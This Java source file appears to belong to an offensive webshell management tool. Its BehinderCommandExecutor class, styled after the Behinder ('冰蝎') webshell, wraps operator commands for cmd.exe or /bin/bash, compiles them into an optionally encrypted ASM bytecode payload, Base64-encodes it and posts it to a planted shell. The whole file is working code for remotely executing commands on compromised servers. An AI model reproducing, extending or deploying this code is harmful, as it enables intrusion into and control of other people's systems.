package com.feihong.executor;

import com.feihong.asm.AsmForBehind;
import com.feihong.bean.CommandExecutionResult;
import com.feihong.util.BasicSetting;
import com.feihong.util.WrappedHttpRequest;

import java.util.Base64;

public class BehinderCommandExecutor implements CommandExecutor {
    @Override
    public String getName() {
        return "冰蝎Style";
    }

    @Override
    public CommandExecutionResult exec(String command) {
        String wrappedCommand = null;
        AsmForBehind asm;
        if(command.equalsIgnoreCase("ipconfig") || command.trim().equalsIgnoreCase("ifconfig")){
            if(BasicSetting.getInstance().encrypt){
                asm = new AsmForBehind(command, true, BasicSetting.getInstance().encryptKey, BasicSetting.getInstance().iv);
            }else{
                asm = new AsmForBehind(command, false, BasicSetting.getInstance().encryptKey, BasicSetting.getInstance().iv);
            }
        }else{
            if(BasicSetting.getInstance().shellPlatform.trim().equalsIgnoreCase("windows")){
                if(BasicSetting.getInstance().encrypt){
                    asm = new AsmForBehind("cmd.exe,/C," + command, true, BasicSetting.getInstance().encryptKey, BasicSetting.getInstance().iv);
                }else{
                    asm = new AsmForBehind("cmd.exe,/C," + command, false, BasicSetting.getInstance().encryptKey, BasicSetting.getInstance().iv);
                }
            }else{
                if(BasicSetting.getInstance().encrypt){
                    asm = new AsmForBehind("/bin/bash,-c," + command, true, BasicSetting.getInstance().encryptKey, BasicSetting.getInstance().iv);
                }else{
                    asm = new AsmForBehind("/bin/bash,-c," + command, false, BasicSetting.getInstance().encryptKey, BasicSetting.getInstance().iv);
                }
            }
        }

        wrappedCommand = Base64.getEncoder().encodeToString(asm.process());
        return WrappedHttpRequest.post(wrappedCommand);
    }
}
